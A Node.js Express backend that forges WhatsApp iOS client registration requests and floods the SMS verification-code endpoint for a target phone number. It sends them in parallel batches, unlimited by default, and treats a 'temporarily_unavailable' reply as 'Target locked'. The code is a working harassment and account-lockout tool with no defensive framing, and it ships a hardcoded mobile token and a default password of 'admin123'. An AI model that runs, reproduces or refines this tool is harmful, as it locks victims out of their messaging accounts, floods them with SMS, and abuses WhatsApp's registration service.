const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const ACCESS_PASSWORD = process.env.ACCESS_PASSWORD || 'admin123';
const DEFAULT_MOBILE_TOKEN = '0a1mLfGUIBVrMKF1RdvLI5lkRBvof6vn0fD2QRSM4174c0243f5277a5d7720ce842cc4ae6';

// State management
let isRunning = false;
let currentTask = null;
let logs = [];

function addLog(message) {
    const entry = `[${new Date().toISOString()}] ${message}`;
    logs.push(entry);
    if (logs.length > 100) logs.shift();
    console.log(entry);
}

// Utility functions for registration
const MOBILE_REGISTRATION_ENDPOINT = 'https://v.whatsapp.net/v2';
const MOBILE_USERAGENT = 'WhatsApp/2.22.24.81 iOS/15.3.1 Device/Apple-iPhone_7';

function urlencode(str) {
    return str.replace(/-/g, '%2d').replace(/_/g, '%5f').replace(/~/g, '%7e');
}

function randomBase64Url(length) {
    return crypto.randomBytes(length).toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

function randomUrlHex(length) {
    const buffer = crypto.randomBytes(length);
    let result = '';
    buffer.forEach((x) => {
        result += `%${x.toString(16).padStart(2, '0').toLowerCase()}`;
    });
    return result;
}

async function requestOTP(cc, number, mobileToken, mcc, mnc) {
    const nationalNumber = number.replace(/[/-\s)(]/g, '').trim();
    const phoneId = uuidv4();
    const deviceId = Buffer.from(uuidv4().replace(/-/g, ''), 'hex').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const e_regid = Buffer.alloc(4);
    e_regid.writeInt32BE(crypto.randomInt(0, 2147483647));

    const tokenSource = Buffer.concat([Buffer.from(mobileToken), Buffer.from(nationalNumber)]);
    const token = crypto.createHash('md5').update(tokenSource).digest('hex');

    const params = {
        cc, in: nationalNumber, Rc: '0', lg: 'en', lc: 'GB', mistyped: '6',
        authkey: randomBase64Url(32),
        e_regid: e_regid.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''),
        e_keytype: 'BQ', e_ident: randomBase64Url(32), e_skey_id: 'AAAA',
        e_skey_val: randomBase64Url(32), e_skey_sig: randomBase64Url(64),
        fdid: phoneId, network_ratio_type: '1', expid: deviceId, simnum: '1',
        hasinrc: '1', pid: crypto.randomInt(0, 1000).toString(),
        id: randomUrlHex(20), backup_token: randomUrlHex(20),
        token, mcc: (mcc || '724').padStart(3, '0'), mnc: (mnc || '001').padStart(3, '0'),
        sim_mcc: '000', sim_mnc: '000', method: 'sms', hasav: '1'
    };

    const queryString = Object.keys(params).map(key => `${key}=${urlencode(params[key].toString())}`).join('&');
    const url = `${MOBILE_REGISTRATION_ENDPOINT}/code?${queryString}`;

    try {
        const response = await axios.get(url, {
            headers: {
                'User-Agent': MOBILE_USERAGENT,
                'Accept': 'application/json'
            },
            timeout: 10000
        });
        return response.data;
    } catch (error) {
        return error.response ? error.response.data : { error: error.message };
    }
}

// Authentication Middleware
const authMiddleware = (req, res, next) => {
    const password = req.headers['x-password'];
    if (password === ACCESS_PASSWORD) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

// API Endpoints
app.get('/health', (req, res) => res.send('Backend is healthy'));

app.post('/verify-password', (req, res) => {
    const { password } = req.body;
    if (password === ACCESS_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/status', authMiddleware, (req, res) => {
    res.json({ isRunning, currentTask, logs });
});

app.post('/start', authMiddleware, (req, res) => {
    if (isRunning) return res.status(400).json({ error: 'Already running' });

    const { cc, number, delay, maxRequests, mobileToken, concurrency, mcc, mnc } = req.body;
    if (!cc || !number) return res.status(400).json({ error: 'Missing parameters' });

    isRunning = true;
    currentTask = { cc, number, delay, maxRequests, concurrency, mcc, mnc };
    logs = [];
    addLog(`Starting task for +${cc}${number} (Concurrency: ${concurrency || 1})`);

    const mToken = mobileToken || DEFAULT_MOBILE_TOKEN;
    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    (async () => {
        let count = 0;
        const totalRequests = parseInt(maxRequests) || Infinity;
        const parallel = parseInt(concurrency) || 1;

        while (isRunning && count < totalRequests) {
            const batch = [];
            const remaining = totalRequests - count;
            const currentBatchSize = Math.min(parallel, remaining);

            for (let i = 0; i < currentBatchSize; i++) {
                batch.push((async (idx) => {
                    const res = await requestOTP(cc, number, mToken, mcc, mnc);
                    addLog(`Request #${idx} Result: ${JSON.stringify(res)}`);
                    if (res.reason === 'temporarily_unavailable') {
                        addLog(`Success: Target locked (temporarily_unavailable).`);
                    }
                })(count + i + 1));
            }
            await Promise.all(batch);
            count += currentBatchSize;

            if (count < totalRequests && isRunning) {
                await wait(parseInt(delay) || 5000);
            }
        }
        isRunning = false;
        currentTask = null;
        addLog('Task finished.');
    })();

    res.json({ success: true });
});

app.post('/stop', authMiddleware, (req, res) => {
    isRunning = false;
    currentTask = null;
    addLog('Stopping task...');
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Backend server listening on port ${PORT}`);
});
